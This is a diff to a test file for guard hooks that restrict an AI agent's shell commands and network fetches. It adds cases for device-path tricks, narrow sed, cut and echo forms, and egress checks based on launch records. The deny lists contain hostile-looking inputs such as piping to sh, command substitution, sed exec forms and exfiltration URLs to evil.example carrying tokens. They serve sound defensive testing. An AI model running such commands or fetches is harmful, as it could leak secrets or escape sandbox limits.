@@ -4,7 +4,7 @@ import "./test-tmp.mjs";
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
-import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
@@ -144,7 +144,7 @@ const DENIED = [
   ["grep foo . > out.txt", /redirection/],
   ["cat a.txt | sh", /`sh`/],
   ["/usr/bin/grep foo .", /not an allowed command/],
-  ["sed -n 1,5p a.txt", /`sed`/],
+  ["sed -i 1,5p a.txt", /`sed`/], // T-11: `sed -n 1,5p a.txt` passes now; -i does not
 ];
 
 test("researcher guard: allowlisted commands pass", () => {
@@ -253,14 +253,16 @@ const DECISIONS = /** @type {[string, "allow" | "deny"][]} */ ([
   ["grep foo . > out.txt", "deny"],
   ["cat a.txt | sh", "deny"],
   ["/usr/bin/grep foo .", "deny"],
-  ["sed -n 1,5p a.txt", "deny"],
+  ["sed -n 1,5p a.txt", "allow"], // T-11 (owner-approved change): was deny
+  ["sed -i 1,5p a.txt", "deny"],
   ["cat > x.py <<EOF\nprint(1)\nEOF", "deny"],
   ["python3 x.py", "deny"],
   ["cd src && ls", "deny"],
   ["git log --oneline | wc -l", "allow"],
   ["cd /x && grep -n foo a.txt", "deny"],
   ["grep foo a.txt | sort", "deny"],
-  ["echo hi", "deny"],
+  ["echo hi", "allow"], // T-11: was deny
+  ["echo hi > a.txt", "deny"],
   ["x=0; grep foo a.txt", "deny"],
   // b4: exactly `2>/dev/null` and `2>&1`, each a word of its own, are the only redirections allowed.
   ["grep foo a.txt 2>/dev/null", "allow"],
@@ -310,11 +312,14 @@ test("researcher guard: every recorded command keeps its allow or deny decision"
 const HINTS = [
   ["cd /x && grep -n foo a.txt", /^`cd` is not an allowed command; .*absolute paths/],
   ["cd src && ls", /^`cd` is not an allowed command; .*absolute paths/],
-  ["sed -n 1,5p a.txt", /^`sed` is not an allowed command; .*Read tool with offset and limit.*`head` and `tail`/],
+  // T-11: `sed` passes in its narrow form; the refusal of any other form names the allowed one.
+  ["sed -i 1,5p a.txt", /^`sed` is allowed only as `sed -n '10p' <file>` or `sed -n '10,40p' <file>`/],
+  ["cut -z a.txt", /^cut -z is not an allowed option; use only -b, -c, -f, -d, -s, --complement and --output-delimiter/],
+  ["stat --bogus a.txt", /^stat --bogus is not an allowed option/],
   ["awk 'NR<5' a.txt", /^`awk` is not an allowed command; .*Read tool with offset and limit.*`head` and `tail`/],
   ["grep foo a.txt | sort", /^`sort` is not an allowed command; .*grep, rg, find, head, tail, cat, ls, wc, du.*in the report/],
   ["uniq a.txt", /^`uniq` is not an allowed command; .*grep, rg, find.*in the report/],
-  ["echo hi", /^`echo` is not an allowed command; .*grep, rg, find.*in the report/],
+  ["tr a b", /^`tr` is not an allowed command; .*grep, rg, find.*in the report/], // T-11: `echo hi` passes now
   ["printf hi", /^`printf` is not an allowed command; .*grep, rg, find.*in the report/],
   ["python3 x.py", /^`python3` is not an allowed command; .*grep, rg, find.*in the report/],
   ["x=0; grep foo a.txt", /^a variable assignment; .*grep, rg, find.*in the report/],
@@ -329,6 +334,181 @@ test("researcher guard: a refused command's reason says what to use instead, in 
   }
 });
 
+// Audit 2026-11-16 T-5: the device rule judges the normalised path (also a relative one, against the command's
+// folder), and wc is under it too. /dev/null stays allowed where it was.
+test("researcher guard (T-5): a device reached by another spelling of its path, or through wc, is refused", () => {
+  for (const c of [
+    "cat /./dev/zero",
+    "cat //dev/zero",
+    "cat /private/../dev/zero",
+    "tail -c +1 /./dev/urandom",
+    "head -c 8 /dev/./zero",
+    "grep --file=//dev/zero x",
+    "rg -f/./dev/urandom x",
+    "grep -rf//dev/urandom x .",
+    "wc /dev/zero",
+    "wc -c /dev/stdin",
+    "wc -l //dev/zero",
+    "cat ../../../../../../../../../../dev/zero",
+  ]) {
+    const v = researcherViolation(c, "/a/b");
+    assert.ok(v, `expected a denial for ${c}`);
+    assert.match(v.reason, /device that may never end/, c);
+  }
+  for (const c of ["cat a.txt /dev/null", "cat a.txt //dev/null", "wc -l a.txt /dev/null", "grep --file=/dev/null x .", "rg -f/dev/null x .", "wc -l /x/a.txt /x/b.txt", "cat ../notes/devices.md", "grep -rn dev ../dev-notes"]) {
+    assert.equal(researcherViolation(c, "/a/b"), null, c);
+  }
+});
+
+// Third review of fix-guards: a symlink to `/` followed by `..` reaches /dev by a path whose text-normalised form does
+// not exist, so the device rule also asks the system for the real path of the unnormalised string.
+test("researcher guard (T-5): a device reached through a symlink and `..` is refused", () => {
+  const links = join(scratch, "device-links");
+  mkdirSync(links, { recursive: true });
+  const link = join(links, "root-link");
+  if (!existsSync(link)) symlinkSync("/", link);
+  for (const c of [
+    `cat ${link}/../dev/zero`,
+    `wc ${link}/../dev/zero`,
+    `grep -f${link}/../dev/zero x`,
+    `grep --file=${link}/../dev/zero x`,
+    `head -c 8 '${link}/../dev/urandom'`,
+    `cut -f1 ${link}/../dev/zero`,
+  ]) {
+    const v = researcherViolation(c, "/a/b");
+    assert.ok(v, `expected a denial for ${c}`);
+    assert.match(v.reason, /device that may never end/, c);
+  }
+  // Relative to the folder the command runs in.
+  for (const c of ["cat root-link/../dev/zero", "wc -c root-link/../dev/zero", "grep -froot-link/../dev/zero x"]) {
+    const v = researcherViolation(c, links);
+    assert.ok(v, `expected a denial for ${c}`);
+    assert.match(v.reason, /device that may never end/, c);
+  }
+  // `cd` stays refused, so a relative path after it never reaches a device the check cannot follow.
+  const v = researcherViolation(`cd ${link} && cat ../dev/zero`, "/a/b");
+  assert.ok(v);
+  assert.match(v.reason, /^`cd` is not an allowed command; .*absolute paths/);
+  // /dev/null through the link, and ordinary files, still pass.
+  for (const c of [`cat ${link}/../dev/null`, `cat ${link}/../etc/hosts`, "cat root-link/../a.txt"]) {
+    assert.equal(researcherViolation(c, links), null, c);
+  }
+});
+
+// Review of fix-guards: a value joined to a short-option cluster (`-rfdev/zero`) can start after any letter, so every
+// suffix of an option word, like a long option's value, is judged as a path from the folder the command runs in.
+test("researcher guard (T-5): a relative device path joined to an option is refused", () => {
+  for (const c of [
+    "grep -fdev/zero x",
+    "grep -rfdev/zero x",
+    "grep -A3fdev/zero x",
+    "rg -fdev/zero x",
+    "rg -nfdev/urandom x",
+    "grep --file=dev/zero x",
+    "rg --file=dev/urandom x",
+    "grep -f dev/zero x",
+    "head -n5 dev/zero",
+    "head -c8dev/zero",
+    "tail -n5 dev/zero",
+    "wc -l dev/zero",
+    "wc -ldev/zero",
+    "sed -n 1p dev/zero",
+    "cut -f1 dev/zero",
+    "cut -sfdev/zero",
+  ]) {
+    const v = researcherViolation(c, "/");
+    assert.ok(v, `expected a denial for ${c}`);
+    assert.match(v.reason, /device that may never end/, c);
+  }
+  for (const c of ["grep -fzero x", "grep -rfzero x"]) {
+    const v = researcherViolation(c, "/dev");
+    assert.ok(v, `expected a denial for ${c}`);
+    assert.match(v.reason, /device that may never end/, c);
+  }
+  // Ordinary option words that are no paths still pass, also from `/`.
+  for (const c of ["grep -n foo a.txt", "grep -rn foo src", "grep -A3 foo a.txt", "grep -e -pattern a.txt"]) {
+    assert.equal(researcherViolation(c, "/a/b"), null, c);
+  }
+  for (const c of ["grep -rn dev x", "grep -rdev x", "head -n5 a.txt", "cut -d, -f1 a.csv", "rg -f/dev/null x", "wc -c dev.txt"]) {
+    assert.equal(researcherViolation(c, "/"), null, c);
+  }
+});
+
+// Audit 2026-11-16 T-11 (approved by the owner): narrow forms of sed -n, cut, stat and echo, which cannot write a file
+// or start a program, pass; their neighbours that could stay refused, each with a message naming the allowed form.
+// `cd` stays refused as before (the pinned decisions above).
+test("researcher guard (T-11): sed -n, cut, stat and echo in their narrow forms pass", () => {
+  for (const c of [
+    "sed -n '10p' a.md",
+    "sed -n '10,40p' a.md b.md",
+    "sed -n 1,5p a.txt",
+    "git show HEAD:a.md | sed -n '3,9p'",
+    "cut -d, -f1 a.csv",
+    "cut -d ',' -f 1,3 a.csv",
+    "cut -c1-10 a.txt",
+    "cut -b 1-4 a.txt",
+    "cut -sf2 -d: a.txt",
+    "cut --complement -f2 a.csv",
+    "cut --output-delimiter=';' -f1,2 -d, a.csv",
+    "cut --output-delimiter ' ' -f1 -d, a.csv",
+    "stat a.txt",
+    "stat -f %z a.txt",
+    "stat -c %s a.txt",
+    "stat --printf='%s\\n' a.txt",
+    "stat -L --format=%y a.txt",
+    "echo ---",
+    "echo hi && cat a.txt",
+    "echo -n done",
+  ]) {
+    assert.equal(researcherViolation(c, "/a/b"), null, c);
+  }
+});
+
+test("researcher guard (T-11): the neighbours of the new forms that could write, run or read for ever stay refused", () => {
+  for (const [c, re] of /** @type {[string, RegExp][]} */ ([
+    // sed: only -n with one line or one range and p.
+    ["sed -i 's/a/b/' a.txt", /`sed` is allowed only as `sed -n '10p' <file>`/],
+    ["sed -i 1,5p a.txt", /`sed` is allowed only as/],
+    ["sed -n '1w out' a.txt", /`sed` is allowed only as/],
+    ["sed -n '1e cmd' a.txt", /`sed` is allowed only as/],
+    ["sed -n 's/a/b/w out' a.txt", /`sed` is allowed only as/],
+    ["sed -n 's/a/b/e' a.txt", /`sed` is allowed only as/],
+    ["sed -n '1p;2p' a.txt", /`sed` is allowed only as/],
+    ["sed -n '$p' a.txt", /`sed` is allowed only as|expansion/],
+    ["sed -e 1p a.txt", /`sed` is allowed only as/],
+    ["sed -n -e 1p a.txt", /`sed` is allowed only as/],
+    ["sed -n 1p -i a.txt", /`sed` is allowed only as/],
+    ["sed -n 1p --in-place a.txt", /`sed` is allowed only as/],
+    ["sed -n 1p -- -i", /`sed` is allowed only as/],
+    ["sed -n 1p *", /`sed` is allowed only as/], // a file named -i would turn into an option
+    ["sed -n -s 1p a.txt", /`sed` is allowed only as/],
+    ["sed 1p a.txt", /`sed` is allowed only as/],
+    ["sed -n 1,5p /dev/zero", /device/],
+    ["sed -n 1p //dev/urandom", /device/],
+    // cut: only -b, -c, -f, -d, -s, --complement and --output-delimiter.
+    ["cut -z -f1 a.txt", /cut -z is not an allowed option; use only -b, -c, -f, -d, -s, --complement and --output-delimiter/],
+    ["cut -n -b1 a.txt", /cut -n is not an allowed option/],
+    ["cut --delimiter=, -f1 a.txt", /cut --delimiter is not an allowed option/],
+    ["cut --fields=1 a.txt", /cut --fields is not an allowed option/],
+    ["cut --zero-terminated -f1 a.txt", /not an allowed option/],
+    ["cut -d, -- --foo", /not an allowed option/],
+    ["cut -f1 /dev/zero", /device/],
+    ["cut -f1 /./dev/urandom", /device/],
+    // stat: long options from an allowlist only.
+    ["stat --bogus a.txt", /stat --bogus is not an allowed option/],
+    // echo: output only, never into a file.
+    ["echo hi > out.txt", /redirection/],
+    ["echo hi >> out.txt", /redirection/],
+    ["echo $(id)", /substitution/],
+    ["echo $HOME", /expansion/],
+    ["printf hi", /`printf`/],
+  ])) {
+    const v = researcherViolation(c, "/a/b");
+    assert.ok(v, `expected a denial for ${JSON.stringify(c)}`);
+    assert.match(v.reason, re, c);
+    assert.ok(v.reason.split(/\. /).length <= 2 && v.reason.length <= 240, `short: ${v.reason}`);
+  }
+});
 
 const bash = (/** @type {string} */ command, /** @type {string | null} */ agentType = "researcher") => ({
   session_id: "s-r", agent_id: "a-r", ...(agentType && { agent_type: agentType }), hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command },
@@ -511,6 +691,42 @@ test("egress guard hook: exit codes, gates.jsonl holds the host only, no decisio
   ]);
   const text = JSON.stringify(gates);
   assert.doesNotMatch(text, /token|leak|Review the change|https?:/); // C7: hosts only
+});
+
+// Audit 2026-11-16 T-6: without a subagent transcript (headless runs keep none) the guard decides from the reviewer's
+// launch record (its urls and sources hosts, and its slice's planned FILES); only with no launch record either is the
+// fetch allowed as egress_unverified.
+test("egress guard (T-6): no transcript, so the launch record's hosts and the slice's planned files decide", () => {
+  const launches = join(stateDir, "journal-launches.jsonl");
+  const add = (/** @type {string} */ agentId, /** @type {string} */ prompt, /** @type {string} */ sid = SID) =>
+    writeFileSync(launches, `${JSON.stringify(launchRecord({ subagent_type: "orchestration:reviewer", prompt }, { sessionId: sid, agentId }))}\n`, { flag: "a" });
+  add("ahl1", "SLICE: s1\nSOURCES: https://src.example:8443/a, docs/links.md\nCHECKS: C1\nC1: matches https://launch.example/spec\nReview the change.");
+  add("ahl2", "SLICE: s7\nReview the change.");
+  add("ahl3", "SLICE: s1\nReview the change against https://other-session.example/x.", "another-session");
+  const o = { dir: stateDir, env: env() };
+  for (const id of ["ahl1", "ahl2", "ahl3"]) assert.equal(agentTranscript(mainTranscript, id), null, "no subagent transcript");
+  for (const [url, id, want] of /** @type {[string, string, string][]} */ ([
+    ["https://launch.example/other", "ahl1", "allow"],
+    ["https://src.example:8443/b", "ahl1", "allow"],
+    ["https://files.example/x", "ahl1", "allow"], // s1's planned files
+    ["https://second.example/x", "ahl1", "allow"],
+    ["https://evil.example/?q=secret", "ahl1", "deny"],
+    ["https://src.example/b", "ahl1", "deny"], // another port
+    ["https://evil.example/?q=secret", "ahl2", "deny"], // a launch record that names no host: nothing is allowed
+    ["https://other-session.example/x", "ahl3", "unverified"], // its launch record is another session's
+  ])) {
+    assert.equal(egressDecision(fetchInput(url, id), o).decision, want, `${id} ${url}`);
+  }
+  const d = egressDecision(fetchInput("https://evil.example/?q=secret", "ahl1"), o);
+  assert.match(String(d.reason), /launch\.example/);
+  assert.doesNotMatch(String(d.reason), /secret/);
+  // The hook: exit 2 for the denial, logged as host_not_in_brief with the host only.
+  const r = run(EGRESS, fetchInput("https://evil.example/leak?token=abc", "ahl1"));
+  assert.equal(r.code, 2);
+  assert.match(r.stderr, /evil\.example/);
+  noDecision(r);
+  const g = readFileSync(join(stateDir, "gates.jsonl"), "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l)).at(-1);
+  assert.deepEqual([g.gate, g.decision, g.reason, g.host, g.agent_id], ["egress", "deny", "host_not_in_brief", "evil.example", "ahl1"]);
 });
 
 // ---- compact context ----
